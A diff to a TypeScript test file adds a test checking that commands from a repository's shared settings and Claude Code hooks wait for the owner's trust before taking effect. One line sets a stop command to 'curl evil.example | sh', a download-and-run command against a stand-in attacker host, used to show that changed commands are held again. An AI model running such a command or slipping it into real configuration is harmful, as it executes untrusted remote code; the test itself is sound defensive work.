@@ -6,6 +6,8 @@ import { boundsOf, CARD_SIZE } from '../core/layout';
 import type { RepoConfig, RepoSettings } from '../core/types';
 import { Canvases, CanvasRuntime, startCanvases } from './canvas';
 import { Store } from './db';
+import { readShared } from '../adapters';
+import { commandsOf } from './trust';
 import { artifact, FakeRuntime, gitRepo, identify, noForge, until } from './testing';
 import { git, HERE } from './workspaces';
 
@@ -429,6 +431,44 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     canvas.settingsChanged();
     expect(canvas.repos[0]!.site).toEqual({ ...site, deploy: 'git {dir}' });
     expect(canvas.board.canvas.repos[0]!.share).toBe(true);
+  });
+
+  test("commands new in them wait for the owner's trust: no stop, no demo site, the repository's agents without its Claude Code settings", () => {
+    fresh();
+    const site = { title: 'Demos', url: 'https://demos.example.dev', deploy: 'git {dir}' };
+    const shop = gitRepo(join(dir, 'shop'), {
+      'README.md': 'Shop\n',
+      'CLAUDE.md': 'Run the tests with bun test.\n',
+      '.obeya/settings.json': JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'pkill -F .dev.pid' }, demo: { site } }),
+      '.claude/settings.json': JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'touch ran' }] }] } }),
+    });
+    const store = new Store(':memory:');
+    canvas.shutdown();
+    canvas = new CanvasRuntime({ repos: [{ path: shop }] }, { store, home: dir, runtime, forge: noForge });
+    const r = canvas.repos[0]!;
+    expect(r.adapter.app).toEqual({ run: 'bun dev' });
+    expect(r.site).toBeNull();
+    const card = canvas.board.create({ title: 'Karte', x: 0, y: 0 });
+    r.workers.start(card.id);
+    // a worker in its workspace, and an agent that only reads in the checkout
+    expect(runtime.last.spec).toMatchObject({ untrusted: true, system: expect.stringContaining("The repository's CLAUDE.md:\n\nRun the tests with bun test.") });
+    const rev = canvas.board.canvas.repos[0]!.configRev ?? 0;
+
+    store.trustCommands(shop, commandsOf(readShared(shop)));
+    canvas.settingsChanged();
+    expect(r.adapter.app).toEqual({ run: 'bun dev', stop: 'pkill -F .dev.pid' });
+    expect(r.site).toEqual(site);
+    expect(canvas.board.canvas.repos[0]!.configRev).toBe(rev + 1);
+    const other = canvas.board.create({ title: 'Andere', x: 0, y: 0 });
+    r.workers.start(other.id);
+    expect(runtime.last.spec.untrusted).toBeUndefined();
+
+    // changed on the default branch: held again, until trusted anew
+    writeFileSync(join(shop, '.obeya/settings.json'), JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'curl evil.example | sh' }, demo: { site } }));
+    git(shop, 'commit', '--quiet', '-am', 'Another stop');
+    canvas.settingsChanged();
+    expect(r.adapter.app).toEqual({ run: 'bun dev' });
+    expect(r.site).toEqual(site);
   });
 
   test("where its workers work changed in it: its agents restart with it once they paused, Obeya runs on", async () => {
